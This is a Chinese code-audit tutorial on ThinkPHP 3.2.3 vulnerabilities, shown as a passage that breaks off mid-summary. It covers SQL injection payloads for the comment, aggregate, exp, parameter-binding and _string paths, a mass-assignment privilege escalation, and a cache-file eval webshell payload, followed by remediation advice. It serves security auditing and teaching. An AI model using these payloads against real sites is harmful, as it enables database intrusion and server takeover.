<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">max</span>(<span class="keyword">id</span>),<span class="string">`username`</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">id</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)<span class="keyword">SELECT</span> <span class="keyword">max</span>(<span class="keyword">id</span>),<span class="string">`username`</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">id</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588219225919.png" alt="1588219225919"></p>
<h3 id="comment方法"><a href="#comment方法" class="headerlink" title="comment方法"></a>comment方法</h3><p><strong>comment</strong><br>COMMENT方法 用于在生成的SQL语句中添加注释内容，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;comment(<span class="string">'aaaaa'</span>)</span><br><span class="line">-&gt;field(<span class="string">'username,score'</span>)</span><br><span class="line">-&gt;limit(<span class="number">10</span>)</span><br><span class="line">-&gt;order(<span class="string">'score desc'</span>)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>

<p>最终生成的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,score <span class="keyword">FROM</span> think_score <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">desc</span> <span class="keyword">LIMIT</span> <span class="number">10</span> <span class="comment">/* aaaaa*/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588473496097.png" alt="1588473496097"></p>
<p><strong>实例：</strong><br>当comment的参数可控时，便存在漏洞。代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">M('User')-&gt;where('1=1')-&gt;comment(I('com'))-&gt;select();</span><br></pre></td></tr></table></figure>

<p>构造语句如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?com=aaa*/ and 1=updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure>

<p>生成sql语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">WHERE</span> ( <span class="number">1</span>=<span class="number">1</span> )  <span class="comment">/* aaa*/</span> <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># */</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588473704606.png" alt="1588473704606"></p>
<h3 id="query-execute-聚合方法"><a href="#query-execute-聚合方法" class="headerlink" title="query/execute/聚合方法"></a><strong>query/execute/聚合方法</strong></h3><p>query方法用于执行SQL查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集（同select方法）。</p>
<p>使用示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model = <span class="keyword">new</span> user() <span class="comment">// 实例化一个model对象 没有对应任何数据表</span></span><br><span class="line">$Model-&gt;query(<span class="string">"select * from thinkphp_user where status=1"</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>实例化一个空模型后，使用query方法查询数据<br>$data = M()-&gt;query(‘select * from thinkphp_user’);</p>
<p>dump($data);</p>
</blockquote>
<p><strong>EXECUTE方法</strong></p>
<p>execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。</p>
<p>使用示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model = <span class="keyword">new</span> \Think\Model() <span class="comment">// 实例化一个model对象 没有对应任何数据表</span></span><br><span class="line">$Model-&gt;execute(<span class="string">"update think_user set name='thinkPHP' where status=1"</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>M()-&gt;execute(“update thinkphp_user set username=’user’ where id=1”);</p>
</blockquote>
<p><strong>聚合方法</strong><br>count，max，avg，sum，min这五个方法的注入场景类似</p>
<blockquote>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">$<span class="class"><span class="keyword">data</span> = <span class="type">M</span>('<span class="title">user'</span>)-&gt;count(<span class="type">I</span>('<span class="title">count'</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="title">dump</span>($<span class="class"><span class="keyword">data</span>);</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>传入<br>count=*<br>生成的sql语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW COLUMNS FROM `thinkphp_user` [ RunTime:0.0014s ]</span><br><span class="line">SELECT COUNT(*) AS tp_count FROM `thinkphp_user` LIMIT 1 [ RunTime:0.0003s ]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588478044142.png" alt="1588478044142"></p>
<p>payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username) as tp_count FROM `thinkphp_user` where 1=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> <span class="keyword">version</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588478110812.png" alt="1588478110812"></p>
<p>此时的SQL语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(username) <span class="keyword">as</span> tp_count <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">version</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>成实现注入</p>
<h2 id="EXP注入"><a href="#EXP注入" class="headerlink" title="EXP注入"></a>EXP注入</h2><p><strong>EXP：表达式</strong></p>
<p>支持更复杂的查询情况 例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$map['id']  = array('in','1,3,8');</span><br></pre></td></tr></table></figure>

<p>可以改成：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$map['id']  = array('exp',' IN (1,3,8) ');</span><br></pre></td></tr></table></figure>

<p>exp查询的条件不会被当成字符串，所以后面的查询条件可以使用任何SQL支持的语法，包括使用函数和字段名称。查询表达式不仅可用于查询条件，也可以用于数据更新，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$User = M("User"); // 实例化User对象</span><br><span class="line">// 要修改的数据对象属性赋值</span><br><span class="line">$data['name'] = 'ThinkPHP';</span><br><span class="line">$data['score'] = array('exp','score+1');// 用户的积分加1</span><br><span class="line">$User-&gt;where('id=5')-&gt;save($data); // 根据条件保存修改的数据</span><br></pre></td></tr></table></figure>

<p><strong>实例</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$map=<span class="keyword">array</span>();  </span><br><span class="line">$map[<span class="string">'id'</span>]=$_GET[<span class="string">'id'</span>];  </span><br><span class="line">$data=M(<span class="string">'User'</span>)-&gt;where($map)-&gt;find();  </span><br><span class="line">dump($data);</span><br></pre></td></tr></table></figure>

<p>传入id=1,此时的SQL语句为</p>
<blockquote>
<ol>
<li>SHOW COLUMNS FROM <code>thinkphp_user</code> [ RunTime:0.0013s ]</li>
<li>SELECT * FROM <code>thinkphp_user</code> WHERE <code>id</code> = 1 LIMIT 1   [ RunTime:0.0007s ]</li>
</ol>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588583393508.png" alt="1588583393508"></p>
<p>当传入参数可控且无过滤时，构造如下payload：</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id[0]=exp&amp;id[1]==1%20and%201=updatexml(1,concat (0x7e,(<span class="keyword">SELECT</span>%<span class="number">20</span>@@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588583716549.png" alt="1588583716549"></p>
<p>此时的SQL语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> =<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># LIMIT 1</span></span><br></pre></td></tr></table></figure>

<p>修复方法：使用官方推荐的I()方法传入参数就可以很好地过滤传入的参数，修复此漏洞。</p>
<p><strong>断点调试</strong></p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584159093.png" alt="1588584159093"></p>
<p>跟到<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>select</code>函数</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584224824.png" alt="1588584224824"></p>
<p>再跟到select函数中，再进入<code>buildSelectSql</code>函数中<br><img src="/2020/05/05/ThinkPHP3.2.3/1588584294380.png" alt="1588584294380"></p>
<p>之后进入到<code>parseSql</code>函数中</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584411090.png" alt="1588584411090"></p>
<p>继续F7进入，直到进入parseWhereItem函数<br><img src="/2020/05/05/ThinkPHP3.2.3/1588584737080.png" alt="1588584737080"></p>
<p>$exp的值是$val[0]的值，也就是poc中的exp，经过判断以后，直接吧$key和$val[1]进行了字符串拼接</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588584841471.png" alt="1588584841471"></p>
<p>val值就是我们刚才传入进来的值，拼接以后变成</p>
<blockquote>
<p><code>id</code> =1 and 1=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# LIMIT 1</p>
</blockquote>
<p>最终导致注入</p>
<h2 id="Action参数绑定注入"><a href="#Action参数绑定注入" class="headerlink" title="Action参数绑定注入"></a>Action参数绑定注入</h2><p>一般审计的时候先查找I方法或者$_GET、$_POST等原生态的请求，从而忽略掉action参数传入的变量</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = M(<span class="string">'user'</span>)-&gt;field(<span class="string">'username'</span>)</span><br><span class="line">                            -&gt;where($id)</span><br><span class="line">                            -&gt;select();</span><br><span class="line">    dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果带人到where方法里，表示以字符的形式查询，也就造成了注入。<br><strong>案例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intval($id) &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        $data = M(<span class="string">'User'</span>)-&gt;where(<span class="string">'id='</span> . $id)-&gt;select();</span><br><span class="line">        dump($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码中使用$_GET方式获取参数，但未进行过滤操作，导致存在注入漏洞。<br>构造如下语句，便可进行注入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>最后生成的sql语句如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `thinkphp_user` WHERE ( id=<span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># )</span></span><br></pre></td></tr></table></figure>

<p>可以使用如下正则去查找是否存在此漏洞：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">public\s+function\s+[\w_*]+\(\$</span><br></pre></td></tr></table></figure>



<h2 id="组合注入"><a href="#组合注入" class="headerlink" title="组合注入"></a>组合注入</h2><p>组合查询主体还是采用数组方式查询，只是加入了一些特殊的查询支持，包括字符串模式查询(_string)、请求字符串查询(_query)</p>
<p>*<em>_string 注入 *</em></p>
<p><strong>字符串模式查询</strong></p>
<p>数组条件可以和字符串条件（采用_string 作为查询条件）混合使用，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$User = M(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$map[<span class="string">'id'</span>] = <span class="keyword">array</span>(<span class="string">'neq'</span>,<span class="number">1</span>);</span><br><span class="line">$map[<span class="string">'name'</span>] = <span class="string">'ok'</span>;</span><br><span class="line">$map[<span class="string">'_string'</span>] = <span class="string">'status=1 AND score&gt;10'</span>;</span><br><span class="line">$User-&gt;where($map)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>最后得到的查询条件就成了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">( `id` != 1 ) AND ( `name` = 'ok' ) AND ( status=1 AND score&gt;10 )</span><br></pre></td></tr></table></figure>

<p><strong>_query注入</strong></p>
<p><strong>请求字符串查询方式</strong></p>
<p>请求字符串查询是一种类似于URL传参的方式，可以支持简单的条件相等判断。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$map[<span class="string">'id'</span>] = <span class="keyword">array</span>(<span class="string">'gt'</span>,<span class="string">'100'</span>);</span><br><span class="line">$map[<span class="string">'_query'</span>] = <span class="string">'status=1&amp;score=100&amp;_logic=or'</span>;</span><br></pre></td></tr></table></figure>

<p>得到的查询条件是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`id`&gt;<span class="number">100</span> <span class="keyword">AND</span> (`status` = <span class="string">'1'</span> <span class="keyword">OR</span> `score` = <span class="string">'100'</span>)</span><br><span class="line">案例：</span><br><span class="line">$User = M(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$map[<span class="string">'id'</span>] = <span class="keyword">array</span>(<span class="string">'neq'</span>,<span class="number">1</span>);</span><br><span class="line">$map[<span class="string">'name'</span>] = <span class="string">'ok'</span>;</span><br><span class="line">$map[<span class="string">'_string'</span>] = <span class="string">'score='</span>.I(<span class="string">'score'</span>);</span><br><span class="line">$User-&gt;where($map)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>利用方式同Action参数注入。</p>
<h1 id="其他漏洞审计"><a href="#其他漏洞审计" class="headerlink" title="其他漏洞审计"></a>其他漏洞审计</h1><h2 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h2><p><strong>自动完成</strong></p>
<p>自动完成是ThinkPHP提供用来完成数据自动处理和过滤的方法，使用create方法创建数据对象的时候会自动完成数据处理。</p>
<p>因此，在ThinkPHP使用create方法来创建数据对象是更加安全的方式，而不是直接通过add或者save方法实现数据写入。</p>
<p><strong>静态定义</strong></p>
<p>预先在模型类里面定义好自动完成的规则，我们称之为静态定义。例如，我们在模型类定义<code>_auto</code>属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">     <span class="keyword">protected</span> $_auto = <span class="keyword">array</span> ( </span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'status'</span>,<span class="string">'1'</span>),  <span class="comment">// 新增的时候把status字段设置为1</span></span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'password'</span>,<span class="string">'md5'</span>,<span class="number">3</span>,<span class="string">'function'</span>) , <span class="comment">// 对password字段在新增和编辑的时候使md5函数处理</span></span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'name'</span>,<span class="string">'getName'</span>,<span class="number">3</span>,<span class="string">'callback'</span>), <span class="comment">// 对name字段在新增和编辑的时候回调getName方法</span></span><br><span class="line">         <span class="keyword">array</span>(<span class="string">'update_time'</span>,<span class="string">'time'</span>,<span class="number">2</span>,<span class="string">'function'</span>), <span class="comment">// 对update_time字段在更新的时候写入当前时间戳</span></span><br><span class="line">     );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，就可以在使用create方法创建数据对象的时候自动处理：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line"><span class="keyword">if</span> (!$User-&gt;create())&#123; <span class="comment">// 创建数据对象</span></span><br><span class="line">     <span class="comment">// 如果创建失败 表示验证没有通过 输出错误提示信息</span></span><br><span class="line">     <span class="keyword">exit</span>($User-&gt;getError());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="comment">// 验证通过 写入新增数据</span></span><br><span class="line">     $User-&gt;add();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有定义任何自动验证规则，则不需要判断create方法的返回值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$User-&gt;create(); <span class="comment">// 生成数据对象</span></span><br><span class="line">$User-&gt;add(); <span class="comment">// 新增用户数据</span></span><br></pre></td></tr></table></figure>

<p>或者更简单的使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$User-&gt;create(); <span class="comment">// 生成数据对象</span></span><br><span class="line">$User-&gt;add(); <span class="comment">// 写入数据</span></span><br></pre></td></tr></table></figure>

<p><strong>案例：</strong><br>当Model使用未经过滤的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $_auto = <span class="keyword">array</span> (  </span><br><span class="line">  <span class="keyword">array</span>(<span class="string">'password'</span>,<span class="string">'md5'</span>,<span class="number">3</span>,<span class="string">'function'</span>) , <span class="comment">// 对password字段在新增和编辑的时候使md5函数处理  </span></span><br><span class="line">  <span class="keyword">array</span>(<span class="string">'score'</span>,<span class="string">'10'</span>),<span class="comment">//普通会员注册给10分  </span></span><br><span class="line">  <span class="keyword">array</span>(<span class="string">'username'</span>,<span class="string">''</span>,<span class="number">3</span>,<span class="string">'ignore'</span>),  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>再使用如下代码调用时，便会存在漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$User = D(<span class="string">"User"</span>); <span class="comment">// 实例化User对象  </span></span><br><span class="line"><span class="keyword">if</span> (!$User-&gt;create())&#123; <span class="comment">// 创建数据对象  </span></span><br><span class="line"> <span class="comment">// 如果创建失败 表示验证没有通过 输出错误提示信息  exit($User-&gt;getError());  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  <span class="comment">// 验证通过 写入新增数据  </span></span><br><span class="line">  $User-&gt;add();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当使用如下url访问时：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/ThinkPHP/index.php/home/User/addUser</span></span><br><span class="line">post：username=ad&amp;password=<span class="number">123</span>&amp;score=<span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>其最后sql语句为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">INSERT INTO `thinkphp_user` (`username`,`password`) VALUES (<span class="string">'ad'</span>,<span class="string">'123'</span>)</span><br></pre></td></tr></table></figure>

<p>然后，当使用下面url访问时便可造成越权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/ThinkPHP/index.php/home/User/addUser</span></span><br><span class="line">post：username=a&amp;password=<span class="number">123</span>&amp;score=<span class="number">21</span>&amp;level=<span class="number">2</span></span><br><span class="line">其中level表示注册的会员等级（level默认为<span class="number">0</span>）</span><br></pre></td></tr></table></figure>

<h2 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h2><p><strong>数据缓存，快速缓存参考<a href="http://document.thinkphp.cn/manual_3_2.html#fast_cache" target="_blank" rel="noopener">thinkphp3.2.3完全开发手册</a></strong></p>
<p>漏洞代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $a=I(<span class="string">'post.a'</span>);</span><br><span class="line">    S(<span class="string">'name'</span>,$a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后使用post传入</p>
<blockquote>
<p>a=phpinfo();</p>
</blockquote>
<p>在<code>application/runtime/temp/</code>目录中成功生成里缓存文件</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588660627551.png" alt="1588660627551"></p>
<p>由于被注释了，所以使用<code>%0d%0a</code>换行来绕过行注释</p>
<blockquote>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%0d%0aeval($_POST[<span class="string">'cmd'</span>]);%0d%0a<span class="comment">//</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1588661596159.png" alt="1588661596159"></p>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>常规注入过滤<br>1.where 方法<br>Where、query、execute 方法建议采用预处理机制，抛开传统的拼接 SQL 语句的思想<br>采用下面的条件预处理<br>$Model-&gt;where(“id=%d and username=’%s’ and xx=’%f’”,array($id,$username,$xx))-&gt;select();<br>$model-&gt;query(‘select * from user where id=%d and status=%d’,$id,$status); </p>
<p>2.Field、table 等方法<br>如果需要从获取外界的值，一定要对这些值进行安全过滤，比如过滤掉 Mysql 里的三大注释符 – -、#、/**/ 、还有一个反引号 ` </p>
<p>3.Exp 注入限制<br>只需配置  REQUEST_VARS_FILTER = true </p>
<p>4.缓存设置<br>官方推荐设置 DATA_CACHE_KEY 参数，避免缓存文件名被猜测到。 </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>thinkphp3框架常见漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>where后直接直接拼接会产生注入</span><br><span class="line">$data = M(<span class="string">'user'</span>)-&gt;where(<span class="string">"id="</span>.I(<span class="string">'id'</span>))-&gt;select();</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span> table表名函数可控产生注入</span><br><span class="line">M()-&gt;table(I(<span class="string">'biao'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;select();  </span><br><span class="line">table ?biao=thinkphp_user where <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (select @@version),<span class="number">0x7e</span>)))-- -a 表名必须存在。</span><br><span class="line"> </span><br><span class="line"><span class="number">3.</span> field函数可控产生注入</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;field(I(<span class="string">'id'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;select(); </span><br><span class="line"><span class="comment">//SELECT `id` FROM `thinkphp_user` WHERE ( 1=1 ) id可控导致注入</span></span><br><span class="line"> </span><br><span class="line"><span class="number">4.</span> field别名可控存在注入</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;field(<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'username'</span>=&gt;I(<span class="string">'name'</span>)))-&gt;select(); </span><br><span class="line"><span class="comment">// SELECT `id`,`username` AS `uname` FROM `thinkphp_user` //别名 ?name=uname`a报错</span></span><br><span class="line"> </span><br><span class="line"><span class="number">5.</span>-&gt;(alias|join|union)\s*\((\$|\$_|I) 用正则查找 alias|join|union参数可控制</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;field(I(<span class="string">'id'</span>))-&gt;union(<span class="string">'select 1 from thinkphp_user'</span>)-&gt;select();</span><br><span class="line"> </span><br><span class="line"><span class="number">6.</span>order,group,having参数可控</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;where(<span class="string">'1=1'</span>)-&gt;order(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;I(<span class="string">'orderby'</span>)))-&gt;select();</span><br><span class="line"> SELECT * FROM `thinkphp_user` WHERE ( <span class="number">1</span>=<span class="number">1</span> ) ORDER BY `id` asc ---?orderby=asc</span><br><span class="line"> </span><br><span class="line"><span class="number">7.</span>comment注入</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;comment(I(<span class="string">'comment'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;select(); </span><br><span class="line">SELECT * FROM `thinkphp_user` WHERE ( <span class="number">1</span>=<span class="number">1</span> ) <span class="comment">/* 111111111 */</span> comment=<span class="number">111111111</span></span><br><span class="line"> </span><br><span class="line"><span class="number">8.</span>索引注入</span><br><span class="line">$Model-&gt;index(I(<span class="string">'user'</span>))-&gt;select();</span><br><span class="line"> </span><br><span class="line"><span class="number">9.</span>query,execute，聚合函数支持原生的sql语句 </span><br><span class="line">M(<span class="string">'user'</span>)-&gt;count(I(<span class="string">'par'</span>)); <span class="comment">//聚合函数 SELECT COUNT(*) AS tp_count FROM `thinkphp_user` LIMIT 1 ?par=*</span></span><br><span class="line"> </span><br><span class="line"><span class="number">10.</span>exp注入</span><br><span class="line">a.)</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">'user'</span>] = $_POST[<span class="string">'username'</span>]; </span><br><span class="line">$data[<span class="string">'pass'</span>] = md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;where($data)-&gt;find();</span><br><span class="line">payload: username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]=aa<span class="string">'or 1=1%23&amp;password=1</span></span><br><span class="line"><span class="string">b.)</span></span><br><span class="line"><span class="string">$res=M('</span>member<span class="string">')-&gt;where(array('</span>id<span class="string">'=&gt;$_GET['</span>userid<span class="string">']))-&gt;count();   </span></span><br><span class="line"><span class="string">payload:userid[0]=exp&amp;userid[1]=aaaaaa</span></span><br><span class="line"><span class="string">c.)通过I函数exp注入就不存在了</span></span><br><span class="line"><span class="string">$res = M('</span>member<span class="string">')-&gt;where(array('</span>id<span class="string">'=&gt;$I('</span>userid<span class="string">')))-&gt;count();</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">11、参数传递注入 public\s+function\s+[\w_]+\(\$</span></span><br><span class="line"><span class="string">public function index(/*$id*/)</span></span><br><span class="line"><span class="string">if(intval($id)&gt;0)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> $data = M('</span>user<span class="string">')-&gt;where('</span>id=<span class="string">'.$id)-&gt;select(); //?id=1) 直接绕过判断</span></span><br><span class="line"><span class="string"> dump($data);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">12.setInc注入</span></span><br><span class="line"><span class="string">$user = M("user");</span></span><br><span class="line"><span class="string">$user-&gt;where('</span>id=<span class="number">5</span><span class="string">')-&gt;setInc('</span>sorce<span class="string">'.I('</span>num<span class="string">'));</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">13.组合注入</span></span><br><span class="line"><span class="string">$map['</span>id<span class="string">'] = I('</span>id<span class="string">');</span></span><br><span class="line"><span class="string">$map['</span>_string<span class="string">'] = '</span>username=<span class="string">'."'</span><span class="string">".I('username')."</span><span class="string">'"; </span></span><br><span class="line"><span class="string">$data = M('</span>user<span class="string">')-&gt;where($map)-&gt;select();</span></span><br><span class="line"><span class="string">dump(data);</span></span><br><span class="line"><span class="string">[url]http://127.0.0.1/tp/index.php/home/user/index?id=5&amp;username=afanti[/url] </span></span><br><span class="line"><span class="string">SELECT * FROM `thinkphp_user` WHERE `id` = 5 AND ( username='</span>afanti<span class="string">' )</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">14、_query参数可控</span></span><br><span class="line"><span class="string">$map['</span>id<span class="string">'] = 5;</span></span><br><span class="line"><span class="string">$map['</span>_query<span class="string">']='</span>username=afanti&amp;score=<span class="number">10</span><span class="string">'; </span></span><br><span class="line"><span class="string">$data = M('</span>user<span 